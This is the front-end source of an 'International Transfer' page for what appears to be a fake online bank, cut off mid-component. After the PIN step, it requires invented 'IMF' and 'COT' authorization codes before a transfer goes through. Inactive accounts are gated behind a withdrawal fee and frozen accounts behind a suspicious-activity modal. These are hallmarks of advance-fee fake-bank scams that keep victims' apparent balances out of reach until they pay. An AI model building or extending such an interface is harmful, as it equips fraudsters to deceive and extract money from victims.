'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import toast from 'react-hot-toast';
import { useAuth } from '@/contexts/AuthContext';
import { useSiteSettings } from '@/hooks/useSiteSettings';
import { getUserCurrencySymbol } from '@/lib/currency';
import {
  Globe,
  ChevronRight,
  Wallet,
  User,
  Hash,
  Building2,
  MapPin,
  Code,
  CreditCard,
  MessageSquare,
  Lock,
  Eye,
  EyeOff,
  ArrowLeft,
  Shield,
  AlertTriangle,
  CheckCircle,
  X,
  Loader2,
  MoreHorizontal,
  KeyRound,
  Mail,
  AlertCircle,
} from 'lucide-react';

type VerificationStep = 'form' | 'imf' | 'cot' | 'otp' | 'complete';

type TransferMethod = 
  | 'wire'
  | 'paypal'
  | 'wise'
  | 'cashapp'
  | 'zelle'
  | 'venmo'
  | 'revolut'
  | '';

interface TransferMethodOption {
  id: TransferMethod;
  name: string;
  description: string;
  icon: string;
  color: string;
}

const transferMethods: TransferMethodOption[] = [
  { id: 'wire', name: 'Wire Transfer', description: 'Transfer funds directly to international bank accounts.', icon: '🏦', color: 'bg-blue-500/20' },
  { id: 'paypal', name: 'PayPal', description: 'Transfer funds to your PayPal account.', icon: '💳', color: 'bg-indigo-500/20' },
  { id: 'wise', name: 'Wise Transfer', description: 'Transfer with lower fees using Wise.', icon: '🌐', color: 'bg-green-500/20' },
  { id: 'cashapp', name: 'Cash App', description: 'Quick transfers to your Cash App account.', icon: '💵', color: 'bg-emerald-500/20' },
];

const moreTransferMethods: TransferMethodOption[] = [
  { id: 'zelle', name: 'Zelle', description: 'Quick transfers to your Zelle account.', icon: '⚡', color: 'bg-purple-500/20' },
  { id: 'venmo', name: 'Venmo', description: 'Send funds to your Venmo account.', icon: '💸', color: 'bg-blue-500/20' },
  { id: 'revolut', name: 'Revolut', description: 'Transfer to your Revolut account with low fees.', icon: '🔄', color: 'bg-pink-500/20' },
];


export default function InternationalTransferPage() {
  const router = useRouter();
  const { user } = useAuth();
  const { settings } = useSiteSettings();
  
  const [selectedMethod, setSelectedMethod] = useState<TransferMethod>('');
  const [showMoreMethods, setShowMoreMethods] = useState(false);
  const [showPin, setShowPin] = useState(false);
  const [showPreview, setShowPreview] = useState(false);
  const [showFeeModal, setShowFeeModal] = useState(false);
  const [showFrozenModal, setShowFrozenModal] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Multi-step verification state
  const [currentStep, setCurrentStep] = useState<VerificationStep>('form');
  const [transferId, setTransferId] = useState<string>('');
  const [verificationCode, setVerificationCode] = useState('');
  const [otpSent, setOtpSent] = useState(false);
  const [pendingTransferData, setPendingTransferData] = useState<Record<string, unknown> | null>(null);

  // Form data
  const [amount, setAmount] = useState('');
  const [description, setDescription] = useState('');
  const [pin, setPin] = useState('');

  // Wire Transfer fields
  const [accountName, setAccountName] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [bankName, setBankName] = useState('');
  const [bankAddress, setBankAddress] = useState('');
  const [country, setCountry] = useState('');
  const [swiftCode, setSwiftCode] = useState('');
  const [iban, setIban] = useState('');
  const [accountType, setAccountType] = useState('savings');


  // PayPal fields
  const [paypalEmail, setPaypalEmail] = useState('');

  // Wise fields
  const [wiseFullName, setWiseFullName] = useState('');
  const [wiseEmail, setWiseEmail] = useState('');
  const [wiseCountry, setWiseCountry] = useState('');

  // Cash App fields
  const [cashAppTag, setCashAppTag] = useState('');
  const [cashAppFullName, setCashAppFullName] = useState('');

  // Zelle fields
  const [zelleEmail, setZelleEmail] = useState('');
  const [zellePhone, setZellePhone] = useState('');
  const [zelleName, setZelleName] = useState('');

  // Venmo fields
  const [venmoUsername, setVenmoUsername] = useState('');
  const [venmoPhone, setVenmoPhone] = useState('');

  // Revolut fields
  const [revolutFullName, setRevolutFullName] = useState('');
  const [revolutEmail, setRevolutEmail] = useState('');
  const [revolutPhone, setRevolutPhone] = useState('');

  // Use user's currency with fallback to USD
  const userCurrency = user?.currency || 'USD';
  const currencySymbol = getUserCurrencySymbol(userCurrency);
  const accountBalance = user?.balance || 0;

  const formatCurrency = (value: number) => {
    return new Intl.NumberFormat('en-US', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    }).format(value);
  };

  const handleQuickAmount = (value: number) => {
    setAmount(value.toString());
  };

  const getMethodTitle = () => {
    switch (selectedMethod) {
      case 'wire': return 'International Wire Transfer';
      case 'paypal': return 'PayPal Withdrawal';
      case 'wise': return 'Wise Transfer';
      case 'cashapp': return 'Cash App Withdrawal';
      case 'zelle': return 'Zelle Withdrawal';
      case 'venmo': return 'Venmo Withdrawal';
      case 'revolut': return 'Revolut Withdrawal';
      default: return 'International Transfer';
    }
  };

  const getMethodDescription = () => {
    switch (selectedMethod) {
      case 'wire': return 'Funds will reflect in the Beneficiary Account within 72 hours.';
      case 'paypal': return 'Funds will be sent to your PayPal account within 24 hours.';
      case 'wise': return 'Your funds will be processed within 1-2 business days.';
      case 'cashapp': return 'Withdrawals to Cash App are typically processed within 24 hours.';
      case 'zelle': return 'Funds will be sent to your Zelle account typically within a few hours.';
      case 'venmo': return 'Funds will be transferred to your Venmo account within 24 hours.';
      case 'revolut': return 'Funds will be transferred to your Revolut account within 1-2 business days.';
      default: return 'Select a withdrawal method to proceed.';
    }
  };

  const validateForm = () => {
    const amountValue = parseFloat(amount);
    
    if (!amount || amountValue <= 0) {
      toast.error('Please enter a valid amount');
      return false;
    }
    
    if (amountValue > accountBalance) {
      toast.error('Insufficient balance. Please check your available balance and try a smaller amount.');
      return false;
    }
    
    if (!pin || pin.length !== 4) {
      toast.error('Please enter your 4-digit transaction PIN');
      return false;
    }

    // Method-specific validation
    switch (selectedMethod) {
      case 'wire':
        if (!accountName || !accountNumber || !bankName || !country || !swiftCode) {
          toast.error('Please fill in all required wire transfer fields');
          return false;
        }
        break;
      case 'paypal':
        if (!paypalEmail) {
          toast.error('Please enter your PayPal email');
          return false;
        }
        break;
      case 'wise':
        if (!wiseFullName || !wiseEmail || !wiseCountry) {
          toast.error('Please fill in all Wise transfer fields');
          return false;
        }
        break;
      case 'cashapp':
        if (!cashAppTag || !cashAppFullName) {
          toast.error('Please fill in all Cash App fields');
          return false;
        }
        break;
      case 'zelle':
        if (!zelleEmail || !zelleName) {
          toast.error('Please fill in all Zelle fields');
          return false;
        }
        break;
      case 'venmo':
        if (!venmoUsername) {
          toast.error('Please enter your Venmo username');
          return false;
        }
        break;
      case 'revolut':
        if (!revolutFullName || !revolutEmail) {
          toast.error('Please fill in all Revolut fields');
          return false;
        }
        break;
    }
    
    return true;
  };

  const handlePreview = (e: React.FormEvent) => {
    e.preventDefault();
    if (validateForm()) {
      setShowPreview(true);
    }
  };

  const getDetailedErrorMessage = (errorMsg: string, statusCode?: number): string => {
    const errorMappings: Record<string, string> = {
      'Invalid PIN': 'The transaction PIN you entered is incorrect. Please check your PIN and try again.',
      'Insufficient': 'Your account balance is insufficient to complete this transfer.',
      'not found': 'The recipient account could not be found. Please verify the details are correct.',
      'Cannot transfer': 'This transfer cannot be processed. The recipient account may be restricted.',
      'limit exceeded': 'You have exceeded your daily transfer limit. Please try again tomorrow.',
      'account is dormant': 'Your account is currently dormant. Please contact customer support.',
      'account is blocked': 'Your account has been temporarily blocked. Please contact support.',
      'verification required': 'Additional verification is required. Please complete your KYC verification.',
      'Unauthorized': 'Your session has expired. Please log in again to continue.',
    };

    // Check for matching error patterns first (before status code check)
    for (const [pattern, message] of Object.entries(errorMappings)) {
      if (errorMsg.toLowerCase().includes(pattern.toLowerCase())) {
        return message;
      }
    }

    // Handle HTTP status codes only if no error message pattern matched
    if (statusCode === 401 && !errorMsg) return 'Your session has expired. Please log in again.';
    if (statusCode === 403) return 'You do not have permission to perform this transfer.';
    if (statusCode === 429) return 'Too many transfer attempts. Please wait before trying again.';
    if (statusCode === 500) return 'Our servers are experiencing issues. Please try again later.';

    return errorMsg || 'An unexpected error occurred. Please try again or contact support.';
  };

  const handleSubmit = async () => {
    const userStatus = user?.status || 'active';

    // Check for frozen account — show suspicious activity modal
    if (userStatus === 'frozen') {
      setShowPreview(false);
      setShowFrozenModal(true);
      return;
    }

    // Check for withdrawal fee requirement when account is inactive
    const withdrawalFee = user?.withdrawalFee || 0;

    if (userStatus === 'inactive' && withdrawalFee > 0) {
      setShowPreview(false);
      setShowFeeModal(true);
      return;
    }
    
    setIsSubmitting(true);
    
    try {
      const token = localStorage.getItem('token');
      
      // First verify PIN before proceeding to code verification
      const pinResponse = await fetch('/api/user/verify-pin', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ pin }),
      });

      const pinData = await pinResponse.json();
      if (!pinResponse.ok) {
        throw new Error(pinData.error || 'Invalid PIN');
      }

      // Store transfer data for later submission after all codes verified
      const transferData = {
        type: 'international',
        accountNumber: selectedMethod === 'wire' ? accountNumber : paypalEmail || wiseEmail || cashAppTag || zelleEmail || venmoUsername || revolutEmail,
        accountName: selectedMethod === 'wire' ? accountName : wiseFullName || cashAppFullName || zelleName || revolutFullName || 'N/A',
        bankName: selectedMethod === 'wire' ? bankName : selectedMethod.toUpperCase(),
        country: selectedMethod === 'wire' ? country : wiseCountry || 'International',
        swiftCode: swiftCode || undefined,
        routingNumber: iban || undefined,
        amount: parseFloat(amount),
        description: description || `${getMethodTitle()} - ${new Date().toLocaleDateString()}`,
        pin,
      };

      setPendingTransferData(transferData);
      setShowPreview(false);
      setCurrentStep('imf');
      toast.success('PIN verified. Please complete verification codes to proceed.');
      
    } catch (err) {
      setShowPreview(false);
      const errorMessage = err instanceof Error ? err.message : 'An unexpected error occurred';
      
      toast.error(
        <div>
          <p className="font-semibold">Verification Failed</p>
          <p className="text-sm mt-1">{errorMessage}</p>
        </div>,
        { duration: 8000 }
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  // Handle verification code submission
  const handleVerifyCode = async (step: 'imf' | 'cot' | 'otp') => {
    if (!verificationCode) {
      toast.error('Please enter the verification code');
      return;
    }
    
    setIsSubmitting(true);
    try {
      const token = localStorage.getItem('token');
      
      // Verify the code against user's stored codes
      const response = await fetch('/api/user/transfers/verify-code', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ step, code: verificationCode, transferId: transferId || undefined }),
      });

      const data = await response.json();
      if (!response.ok) throw new Error(data.error || 'Verification failed');

      setVerificationCode('');
      
      if (step === 'imf') {
        setCurrentStep('cot');
        toast.success('IMF Code verified successfully');
      } else if (step === 'cot') {
        setCurrentStep('otp');
        toast.success('COT Code verified successfully');
      } else if (step === 'otp') {
        // All codes verified - now create the actual transfer
        if (!pendingTransferData) {
          throw new Error('Transfer data not found. Please start over.');
        }
        
        const transferResponse = await fetch('/api/user/transfers', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`,
          },
          body: JSON.stringify({
            ...pendingTransferData,
            codesVerified: true,
          }),
        });

        const transferData = await transferResponse.json();
        if (!transferResponse.ok) {
          throw new Error(transferData.error || 'Transfer failed');
        }

        setCurrentStep('complete');
        toast.success('Transfer completed successfully!');
        setTimeout(() => router.push('/dashboard/transactions'), 3000);
      }
    } catch (err) {
      toast.error(err instanceof Error ? err.message : 'Verification failed');
    } finally {
      setIsSubmitting(false);
    }
  };

  // Handle OTP sending
  const handleSendOtp = async () => {
    setIsSubmitting(true);
    try {
      const token = localStorage.getItem('token');
      const recipientName = pendingTransferData?.accountName as string || 'Recipient';
      const transferAmount = pendingTransferData?.amount as number || parseFloat(amount) || 0;
      
      const response = await fetch('/api/user/transfers/send-otp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ amount: transferAmount, recipientName }),
      });

      const data = await response.json();
      if (!response.ok) throw new Error(data.error || 'Failed to send OTP');

      setOtpSent(true);
      toast.success(data.data.message || 'OTP sent to your email');
    } catch (err) {
      toast.error(err instanceof Error ? err.message : 'Failed to send OTP');
    } finally {
      setIsSubmitting(false);
    }
  };

  const amountValue = parseFloat(amount) || 0;
  const newBalance = accountBalance - amountValue;

  const renderMethodFields = () => {
    switch (selectedMethod) {
      case 'wire':
        return (
          <div className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Beneficiary Account Name *</label>
                <div className="relative">
                  <User className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
                  <input
                    type="text"
                    value={accountName}
                    onChange={(e) => setAccountName(e.target.value)}
                    className="block w-full pl-10 pr-3 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter beneficiary's full name"
                    required
                  />
                </div>
              </div>
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Account Number *</label>
                <div className="relative">
                  <Hash className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
                  <input
                    type="text"
                    value={accountNumber}
                    onChange={(e) => setAccountNumber(e.target.value)}
                    className="block w-full pl-10 pr-3 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter account number"
                    required
                  />
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Bank Name *</label>
                <div className="relative">
                  <Building2 className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
                  <input
                    type="text"
                    value={bankName}
                    onChange={(e) => setBankName(e.target.value)}
                    className="block w-full pl-10 pr-3 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter bank name"
                    required
                  />
                </div>
              </div>
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Bank Address</label>
                <div className="relative">
                  <MapPin className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
                  <input
                    type="text"
                    value={bankAddress}
                    onChange={(e) => setBankAddress(e.target.value)}
                    className="block w-full pl-10 pr-3 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter bank address"
                  />
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Country *</label>
                <div className="relative">
                  <Globe className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
                  <input
                    type="text"
                    value={country}
                    onChange={(e) => setCountry(e.target.value)}
                    className="block w-full pl-10 pr-3 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter country"
                    required
                  />
                </div>
              </div>
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>SWIFT Code *</label>
                <div className="relative">
                  <Code className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
                  <input
                    type="text"
                    value={swiftCode}
                    onChange={(e) => setSwiftCode(e.target.value)}
                    className="block w-full pl-10 pr-3 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter SWIFT/BIC code"
                    required
                  />
                </div>
              </div>
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>IBAN</label>
                <div className="relative">
                  <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
                  <input
                    type="text"
                    value={iban}
                    onChange={(e) => setIban(e.target.value)}
                    className="block w-full pl-10 pr-3 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter IBAN number"
                  />
                </div>
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Account Type</label>
              <select
                value={accountType}
                onChange={(e) => setAccountType(e.target.value)}
                className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
              >
                <option value="savings">Savings Account</option>
                <option value="checking">Checking Account</option>
                <option value="business">Business Account</option>
              </select>
            </div>
          </div>
        );


      case 'paypal':
        return (
          <div className="space-y-5">
            <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>PayPal Email *</label>
            <input
              type="email"
              value={paypalEmail}
              onChange={(e) => setPaypalEmail(e.target.value)}
              className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="Enter your PayPal email"
              required
            />
          </div>
        );

      case 'wise':
        return (
          <div className="space-y-5">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Full Name *</label>
                <input
                  type="text"
                  value={wiseFullName}
                  onChange={(e) => setWiseFullName(e.target.value)}
                  className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Enter your full name"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Email *</label>
                <input
                  type="email"
                  value={wiseEmail}
                  onChange={(e) => setWiseEmail(e.target.value)}
                  className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Enter your Wise email"
                  required
                />
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Country *</label>
              <input
                type="text"
                value={wiseCountry}
                onChange={(e) => setWiseCountry(e.target.value)}
                className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Enter your country"
                required
              />
            </div>
          </div>
        );

      case 'cashapp':
        return (
          <div className="space-y-5">
            <div>
              <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>$Cashtag *</label>
              <input
                type="text"
                value={cashAppTag}
                onChange={(e) => setCashAppTag(e.target.value)}
                className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Enter your $Cashtag"
                required
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Full Name *</label>
              <input
                type="text"
                value={cashAppFullName}
                onChange={(e) => setCashAppFullName(e.target.value)}
                className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Enter your full name"
                required
              />
            </div>
          </div>
        );

      case 'zelle':
        return (
          <div className="space-y-5">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Email *</label>
                <input
                  type="email"
                  value={zelleEmail}
                  onChange={(e) => setZelleEmail(e.target.value)}
                  className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Enter your Zelle email"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Phone</label>
                <input
                  type="tel"
                  value={zellePhone}
                  onChange={(e) => setZellePhone(e.target.value)}
                  className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Enter your phone number"
                />
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Full Name *</label>
              <input
                type="text"
                value={zelleName}
                onChange={(e) => setZelleName(e.target.value)}
                className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Enter your full name"
                required
              />
            </div>
          </div>
        );

      case 'venmo':
        return (
          <div className="space-y-5">
            <div>
              <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Venmo Username *</label>
              <input
                type="text"
                value={venmoUsername}
                onChange={(e) => setVenmoUsername(e.target.value)}
                className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Enter your Venmo username"
                required
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Phone</label>
              <input
                type="tel"
                value={venmoPhone}
                onChange={(e) => setVenmoPhone(e.target.value)}
                className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Enter your phone number"
              />
            </div>
          </div>
        );

      case 'revolut':
        return (
          <div className="space-y-5">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Full Name *</label>
                <input
                  type="text"
                  value={revolutFullName}
                  onChange={(e) => setRevolutFullName(e.target.value)}
                  className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Enter your full name"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Email *</label>
                <input
                  type="email"
                  value={revolutEmail}
                  onChange={(e) => setRevolutEmail(e.target.value)}
                  className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Enter your Revolut email"
                  required
                />
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Phone</label>
              <input
                type="tel"
                value={revolutPhone}
                onChange={(e) => setRevolutPhone(e.target.value)}
                className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Enter your phone number"
              />
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  // Render verification step UI
  const renderVerificationStep = () => {
    const stepConfig = {
      imf: { 
        title: 'IMF Code Verification', 
        desc: 'Enter your IMF (International Monetary Fund) authorization code to proceed with this international transfer.',
        icon: KeyRound,
        placeholder: 'Enter your IMF Code',
      },
      cot: { 
        title: 'COT Code Verification', 
        desc: 'Enter your COT (Cost of Transfer) authorization code to continue.',
        icon: Shield,
        placeholder: 'Enter your COT Code',
      },
      otp: { 
        title: 'OTP Verification', 
        desc: 'Enter the One-Time Password sent to your registered email address.',
        icon: Mail,
        placeholder: 'Enter 6-digit OTP',
      },
      complete: { 
        title: 'Transfer Complete', 
        desc: 'Your international transfer has been successfully processed.',
        icon: CheckCircle,
        placeholder: '',
      },
    };

    const config = stepConfig[currentStep as keyof typeof stepConfig];
    if (!config) return null;

    const IconComponent = config.icon;

    return (
      <div className="max-w-lg mx-auto">
        <div className="rounded-xl overflow-hidden" style={{ backgroundColor: 'rgb(31 41 55)' }}>
          {/* Header */}
          <div className="px-6 py-8 text-center" style={{ background: 'linear-gradient(135deg, #0369a1 0%, #0284c7 50%, #020617 100%)' }}>
            <div className="mx-auto w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mb-4">
              <IconComponent className="h-8 w-8 text-white" />
            </div>
            <h2 className="text-xl font-bold text-white">{config.title}</h2>
            <p className="text-white/80 mt-2 text-sm">{config.desc}</p>
          </div>

          {/* Progress Steps */}
          <div className="px-6 py-4 border-b border-gray-700">
            <div className="flex items-center justify-between">
              {['imf', 'cot', 'otp', 'complete'].map((step, index) => (
                <div key={step} className="flex items-center">
                  <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${
                    currentStep === step ? 'bg-blue-500 text-white' :
                    ['imf', 'cot', 'otp', 'complete'].indexOf(currentStep) > index ? 'bg-green-500 text-white' :
                    'bg-gray-700 text-gray-400'
                  }`}>
                    {['imf', 'cot', 'otp', 'complete'].indexOf(currentStep) > index ? '✓' : index + 1}
                  </div>
                  {index < 3 && <div className={`w-12 h-1 mx-1 ${
                    ['imf', 'cot', 'otp', 'complete'].indexOf(currentStep) > index ? 'bg-green-500' : 'bg-gray-700'
                  }`} />}
                </div>
              ))}
            </div>
            <div className="flex justify-between mt-2 text-xs text-gray-400">
              <span>IMF</span>
              <span>COT</span>
              <span>OTP</span>
              <span>Done</span>
            </div>
          </div>

          {/* Content */}
          <div className="p-6">
            {currentStep === 'complete' ? (
              <div className="text-center py-8">
                <div className="mx-auto w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mb-4">
                  <CheckCircle className="h-10 w-10 text-green-400" />
                </div>
                <h3 className="text-lg font-semibold text-white mb-2">Transfer Successful!</h3>
                <p className="text-gray-400 mb-4">Your transfer of {currencySymbol}{formatCurrency(amountValue)} is being processed.</p>
                <p className="text-sm text-gray-500">Redirecting to transactions...</p>
              </div>
            ) : currentStep === 'otp' && !otpSent ? (
              <div className="text-center py-4">
                <p className="text-gray-400 mb-6">Click the button below to receive your One-Time Password via email.</p>
                <button
                  onClick={handleSendOtp}
                  disabled={isSubmitting}
                  className="inline-flex items-center px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50"
                >
                  {isSubmitting ? (
                    <><Loader2 className="h-5 w-5 mr-2 animate-spin" /> Sending...</>
                  ) : (
                    <><Mail className="h-5 w-5 mr-2" /> Send OTP to Email</>
                  )}
                </button>
              </div>
            ) : (
              <div>
                <div className="mb-6">
                  <label className="block text-sm font-medium text-white mb-2">Verification Code</label>
                  <input
                    type="text"
                    value={verificationCode}
                    onChange={(e) => setVerificationCode(e.target.value)}
                    className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-blue-500"
                    placeholder={config.placeholder}
                    maxLength={currentStep === 'otp' ? 6 : 20}
                  />
                </div>

                <button
                  onClick={() => handleVerifyCode(currentStep as 'imf' | 'cot' | 'otp')}
                  disabled={isSubmitting || !verificationCode}
                  className="w-full inline-flex items-center justify-center px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50"
                >
                  {isSubmitting ? (
                    <><Loader2 className="h-5 w-5 mr-2 animate-spin" /> Verifying...</>
                  ) : (
                    <><CheckCircle className="h-5 w-5 mr-2" /> Verify & Continue</>
                  )}
                </button>

                {currentStep === 'otp' && (
                  <>
                    <button
                      onClick={handleSendOtp}
                      disabled={isSubmitting}
                      className="w-full mt-3 text-sm text-blue-400 hover:text-blue-300"
                    >
                      Resend OTP
                    </button>
                    <div className="mt-4 p-3 bg-blue-500/10 border border-blue-500/20 rounded-lg">
                      <p className="text-xs text-blue-300 text-center leading-relaxed">
                        <span className="font-medium">Didn&apos;t receive the email?</span> Please check your{' '}
                        <span className="font-medium">spam or junk folder</span>. Automated emails may occasionally
                        be filtered by your email provider.
                      </p>
                    </div>
                  </>
                )}
              </div>
            )}

            {/* Warning Notice */}
            {currentStep !== 'complete' && (
              <div className="mt-6 p-4 bg-amber-500/10 border border-amber-500/30 rounded-lg">
                <div className="flex items-start">
                  <AlertTriangle className="h-5 w-5 text-amber-400 shrink-0 mt-0.5" />
                  <div className="ml-3 space-y-1">
                    <p className="text-sm font-medium text-amber-300">Important</p>
                    <p className="text-sm text-amber-200 leading-relaxed">
                      If you haven&apos;t received your verification code, please check your{' '}
                      <span className="font-semibold">inbox and spam/junk folder</span>. If you still need
                      assistance, please contact customer support.
                    </p>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Back Button */}
        {currentStep !== 'complete' && (
          <button
            onClick={() => {
              setCurrentStep('form');
              setTransferId('');
              setVerificationCode('');
              setOtpSent(false);
              setPendingTransferData(null);
            }}
            className="mt-4 inline-flex items-center text-gray-400 hover:text-white"
          >
            <ArrowLeft className="h-4 w-4 mr-2" /> Cancel Transfer
          </button>
        )}
      </div>
    );
  };

  // Check if account is active or dormant
  const userStatus = user?.status || 'active';
  if (userStatus === 'dormant') {
    return (
      <div className="max-w-2xl mx-auto">
        <div className="rounded-xl p-8 text-center" style={{ backgroundColor: 'rgb(31 41 55)' }}>
          <div className="mx-auto w-16 h-16 bg-amber-500/20 rounded-full flex items-center justify-center mb-4">
            <AlertCircle className="h-8 w-8 text-amber-400" />
          </div>
          <h2 className="text-xl font-bold text-white mb-2">Account Dormant</h2>
          <p className="text-gray-400 mb-6">Your account is currently dormant due to inactivity. Please contact our support team to reactivate your account before making international transfers.</p>
          <Link href="/dashboard/support" className="inline-flex items-center px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700">
            Contact Support
          </Link>
        </div>
      </div>
    );
  }
  
  if (userStatus !== 'active' && userStatus !== 'inactive' && userStatus !== 'frozen') {
    return (
      <div className="max-w-2xl mx-auto">
        <div className="rounded-xl p-8 text-center" style={{ backgroundColor: 'rgb(31 41 55)' }}>
          <div className="mx-auto w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mb-4">
            <AlertCircle className="h-8 w-8 text-red-400" />
          </div>
          <h2 className="text-xl font-bold text-white mb-2">Account Inactive</h2>
          <p className="text-gray-400 mb-6">Your account is currently inactive. Please contact support to reactivate your account before making international transfers.</p>
          <Link href="/dashboard/support" className="inline-flex items-center px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700">
            Contact Support
          </Link>
        </div>
      </div>
